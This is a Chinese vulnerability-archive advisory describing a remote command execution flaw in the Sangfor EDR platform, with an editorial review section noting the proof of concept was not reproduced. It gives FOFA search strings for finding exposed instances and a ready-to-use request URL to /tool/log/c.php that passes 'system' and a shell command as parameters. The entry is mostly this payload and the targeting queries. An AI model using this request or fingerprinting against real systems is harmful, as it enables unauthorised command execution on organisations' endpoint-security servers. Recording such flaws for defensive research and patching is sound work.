---
source: "wy876 漏洞文库"
id: "vw-c6dd8d4147318775f562c1fa"
entity_id: "ve-c6dd8d4147318775f562c1fa"
schema_version: "1"
fofa_unverified: "<font style="
title: "深信服EDR平台存在远程命令执行漏洞"
product: "Sangfor EDR"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "版本及鉴权未说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bw1hyzgtaebgmp4x"
source_status: "recorded"
---

# 深信服EDR平台存在远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor EDR
- 本文讨论：c.php strip_slashes/host命令执行
- 版本、权限与配置前提：版本及鉴权未说明
- 资料类型：RCE URL摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- FOFA字段被font和来源污染；无响应/编号/修复，较340同文严重简化
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- CNVD映射与产品版本待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
 深信服终端检测响应平台EDR,通过云网端联动协同、威胁情报共享、多层级响应机制,帮助用户快速处置终端安全问题,构建轻量级、智能化、响应快的下一代终端安全系统。深信服终端监测响应平台（EDR）存在远程命令执行漏洞。

# 二、影响版本
+ 深信服EDR

# 三、资产测绘
+ fofa`<font style="color:rgba(0, 0, 0, 0.9);">app="SANGFOR-EDR"</font>``<font style="color:rgba(0, 0, 0, 0.9);">title="终端检测响应平台"</font>`


# 四、漏洞复现
```plain
/tool/log/c.php?strip_slashes=system&host=id
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bw1hyzgtaebgmp4x>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
